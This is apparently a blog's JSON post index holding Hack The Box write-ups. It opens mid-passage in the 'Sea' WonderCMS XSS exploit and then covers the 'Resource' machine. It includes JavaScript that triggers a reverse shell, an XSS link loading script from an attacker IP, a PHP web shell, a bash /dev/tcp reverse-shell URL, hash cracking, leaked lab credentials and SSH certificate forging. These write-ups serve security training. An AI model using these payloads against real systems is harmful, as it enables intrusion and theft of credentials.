\"http://sea.htb/themes/revshell-main/rev.php\");   xhr4.send();   xhr4.onload = function() {     if (xhr4.status == 200) {       var ip = \"10.10.14.11\";       var port = \"9001\";       var xhr5 = new XMLHttpRequest();       xhr5.withCredentials = true;       xhr5.open(\"GET\", \"http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.11&amp;lport=9001\");       xhr5.send();            }   }; }};Send this link to Admin:http://sea.htb/wondercms/index.php?page=loginURL?\"&gt;&lt;/form&gt;&lt;script+src=\"http://10.10.14.117:9901/xss.js\"&gt;&lt;/script&gt;&lt;form+action=\"Boom, I got reverse shell … After thoroughly going on checking out all directories I found an interesting file in /var/www/sea/data/database.js://$ cat database.js{    \"config\": {        \"siteTitle\": \"Sea\",        \"theme\": \"bike\",        \"defaultPage\": \"home\",        \"login\": \"loginURL\",        \"forceLogout\": false,        \"forceHttps\": false,        \"saveChangesPopup\": false,        \"password\": \"$2y$10$[....]/PjDnXm4q\",        \"lastLogins\": {            \"2024\\/08\\/17 06:12:20\": \"127.0.0.1\",            \"2024\\/08\\/17 06:09:50\": \"127.0.0.1\",            \"2024\\/08\\/17 06:05:20\": \"127.0.0.1\",            \"2024\\/08\\/17 06:01:50\": \"127.0.0.1\",            \"2024\\/08\\/17 06:00:49\": \"127.0.0.1\"        },        \"lastModulesSync\": \"2024\\/08\\/17\",        \"customModules\": {            \"themes\": {},            \"plugins\": {}        },        \"menuItems\": {            \"0\": {                \"name\": \"Home\",                \"slug\": \"home\",                \"visibility\": \"show\",                \"subpages\": {}            },            \"1\": {                \"name\": \"How to participate\",                \"slug\": \"how-to-participate\",                \"visibility\": \"show\",                \"subpages\": {}            }        },        \"logoutToLoginScreen\": {}    },    \"pages\": {        \"404\": {            \"title\": \"404\",            \"keywords\": \"404\",            \"description\": \"404\",            \"content\": \"&lt;center&gt;&lt;h1&gt;404 - Page not found&lt;\\/h1&gt;&lt;\\/center&gt;\",            \"subpages\": {}        },        \"home\": {            \"title\": \"Home\",            \"keywords\": \"Enter, page, keywords, for, search, engines\",            \"description\": \"A page description is also good for search engines.\",            \"content\": \"&lt;h1&gt;Welcome to Sea&lt;\\/h1&gt;\\n\\n&lt;p&gt;Hello! Join us for an exciting night biking adventure! We are a new company that organizes bike competitions during the night and we offer prizes for the first three places! The most important thing is to have fun, join us now!&lt;\\/p&gt;\",            \"subpages\": {}        },        \"how-to-participate\": {            \"title\": \"How to\",            \"keywords\": \"Enter, keywords, for, this page\",            \"description\": \"A page description is also good for search engines.\",            \"content\": \"&lt;h1&gt;How can I participate?&lt;\\/h1&gt;\\n&lt;p&gt;To participate, you only need to send your data as a participant through &lt;a href=\\\"http:\\/\\/sea.htb\\/contact.php\\\"&gt;contact&lt;\\/a&gt;. Simply enter your name, email, age and country. In addition, you can optionally add your website related to your passion for night racing.&lt;\\/p&gt;\",            \"subpages\": {}        }    },    \"blocks\": {        \"subside\": {            \"content\": \"&lt;h2&gt;About&lt;\\/h2&gt;\\n\\n&lt;br&gt;\\n&lt;p&gt;We are a company dedicated to organizing races on an international level. Our main focus is to ensure that our competitors enjoy an exciting night out on the bike while participating in our events.&lt;\\/p&gt;\"        },        \"footer\": {            \"content\": \"©2024 Sea\"        }    }}Gain access user amayI use hashcat to crack this password with rockyou wordlist:$ hashcat -a 0  -m 3200 password rockyou.txt$2y$10$i[...]Xm4q:my*************ceLet’s get the user flag.Reference  Cross Site Scripting vulnerability in Wonder CMS v.3.2.0 thru v.3.4.2 CVE-2023-41425  WonderCMS Vulnerability explain"
  },
  
  {
    "title": "Resource - Hack The Box Machines",
    "url": "/posts/Resource-Hack-The-Box-Machine/",
    "categories": "Hack The Box, Machines",
    "tags": "htb, machine, web, resource, seasonvi",
    "date": "2024-08-08 08:00:00 +0100",
    





    
    "snippet": "ReconnaisanceResource HTB Season VIHello, everyone! 👋 Welcome back. This is the first machine challenge of Season VI and it has a medium difficulty level. As with many previous attempts to pwn a bo...",
    "content": "ReconnaisanceResource HTB Season VIHello, everyone! 👋 Welcome back. This is the first machine challenge of Season VI and it has a medium difficulty level. As with many previous attempts to pwn a box, I will use the nmap tool to scan the target machine and determine which ports are open.[user@machine] - $ nmap -p- 10.10.11.x -T4 --min-rate=1000 -Pn --disable-arp-ping -oN nmapscanStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-04 10:59 EDTWarning: 10.10.11.x giving up on port because retransmission cap hit (6).Nmap scan report for 10.10.11.xHost is up (0.073s latency).Not shown: 63965 closed tcp ports (conn-refused), 1567 filtered tcp ports (no-response)PORT     STATE SERVICE22/tcp   open  ssh80/tcp   open  http2222/tcp open  EtherNetIP-1Nmap done: 1 IP address (1 host up) scanned in 104.88 secondsWith the initial scan, I determined that three ports are open on the target machine: 22, 80, and 2222.[user@machine] - $ nmap -p22,80,2222 -sC -sV 10.10.11.xStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-04 12:10 EDTNmap scan report for 10.10.11.xHost is up (0.12s latency).PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)| ssh-hostkey: |   256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA)|_  256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519)80/tcp   open  http    nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://itrc.ssg.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA)|_  256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 23.22 secondsFrom the nmap scan report, we can see that the target machine has the following open ports and services:  Ports open:          22/tcp: SSH service (OpenSSH 9.2p1 Debian)      80/tcp: HTTP service, redirect to http://itrc.ssg.htb/ and has an nginx/1.18.0 server header.      2222/tcp: SSH service (OpenSSH 8.9p1 on Ubuntu)      I am wondering why there are two SSH services open on different ports for two different versions of OpenSSH?Use this command to add an IP and hostname to file /ect/hosts[user@machine] - $ echo \"10.10.11.x itrc.ssg.htb\" | sudo tee -a /etc/hostsNext, I accessed the target machine on port 80 at http://itrc.ssg.htb, which led me to an IT Support Center page. Reading the introduction section on the website, it mentions Managing SSH Access, …Access webpage on port 80Next, to see what this website does, I need to register an account and log in.Login pageDashboard pageUse ffuf to fuzz the page parameter.[user@machine] - $ ffuf -u http://itrc.ssg.htb/index.php/\\?page\\=FUZZ  -w ~/workspace/machine/SecLists-master/Discovery/DNS/n0kovo_subdomains.txt -fs 3120         /'___\\  /'___\\           /'___\\              /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/              \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\              \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/               \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\                 \\/_/    \\/_/   \\/___/    \\/_/              v1.1.0________________________________________________ :: Method           : GET :: URL              : http://itrc.ssg.htb/index.php/?page=FUZZ :: Wordlist         : FUZZ: /home/natsu/workspace/machine/SecLists-master/Discovery/DNS/n0kovo_subdomains.txt :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200,204,301,302,307,401,403 :: Filter           : Response size: 3120________________________________________________admin                   [Status: 200, Size: 1331, Words: 136, Lines: 26]login                   [Status: 200, Size: 2709, Words: 239, Lines: 44]register                [Status: 200, Size: 2842, Words: 255, Lines: 45]dashboard               [Status: 200, Size: 1331, Words: 136, Lines: 26]db                      [Status: 200, Size: 2276, Words: 158, Lines: 35]ticket                  [Status: 200, Size: 1331, Words: 136, Lines: 26]index                   [Status: 200, Size: 2276, Words: 158, Lines: 35]logout                  [Status: 200, Size: 2627, Words: 196, Lines: 39]Accessing the page=admin, I see several tickets with subjects such as Malware in finance dept and SSH Key Signing Broken, but I cannot access most of these tickets to view their detailed contents.And one notable thing is that under Admin Tools, I see Contact zzinter for manual provisioningAccess web at admin pageGoing back to the dashboard, I tried to create a ticket with the subject New ticket and uploaded a ZIP file.When I right-clicked on the file.zip location, I saw that the uploaded file is stored at the path: itrc.ssg.htb/uploads/a00308c0438df0f0cb98f5261ca9124e57fcd1ed.zipLooking at the filename, it appears to be some sort of hash, and it is indeed a SHA-1 hash.sha1sum file.zipAfter uploading a regular ZIP file, I tried uploading an empty file to see if any errors occurred.In the response, I noticed that two functions mentioned in the misreporting are ZipArchive::open() and hash_file() in the file /var/www/savefile.inc.phpUpload empty file zipLFI loopholeAccess file in /var/www/itrcTest the LFI loophole with some protocols like file, dict, phar: itrc.ssg.htb/?page=file:///var/www/itrc/create_ticket.LFI loopholeRCE www-dataUpload file shell and RCE&lt;?php\tsystem($_GET[\"cmd\"]);\t__HALT_COMPILER();?&gt;$ zip shell.zip shell.php$ sha1sum shell.ziphttp://itrc.ssg.htb/?page=phar://uploads/aee15c9bfb55e6c04a49b57d2c62a215f62e1d26.zip/shell&amp;cmd=/bin/bash+-c+%27/bin/bash+-i+%3E%26+/dev/tcp/&lt;your ip&gt;/9001+0%3E%261%27Listen and get reverse shell.Reverse shellwww-data@itrc:/var/www/itrc$ cat db.php&lt;?php$dsn = \"mysql:host=db;dbname=resourcecenter;\";$dbusername = \"jj\";$dbpassword = \"ugEG5rR5SG8uPd\";$pdo = new PDO($dsn, $dbusername, $dbpassword);try {    $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);} catch (PDOException $e) {    die(\"Connection failed: \" . $e-&gt;getMessage());}Home foldermsainristil@itrcAs mentioned earlier in the admin page, we saw several tickets that had already been created, and upon checking the uploads directory, I found multiple ZIP files. It’s possible that, besides the files I uploaded, the remaining files were uploaded by those tickets.I used zipgrep to check if any of these ZIP files contain sensitive information.$ for zipfile in *.zip; do zipgrep \"msainristil\" \"$zipfile\"; done\"user=msainristil&amp;pass=82yards2closeit\"User msainristilSSH to target machine with username and password msainristil:82yards2closeitSSH user msainristilCertificate CAzzinter@itrc$ ssh-keygen -t rsa -b 2048 -f yzx$ ssh-keygen -s ca-itrc -I ca-itrc.pub -n zzinter yzx.pub$ ssh-keygen -Lf yzx-cert.pub$ ssh -o CertificateFile=yzx-cert.pub -i yzx zzinter@localhostGet user flag"
  }
  
]

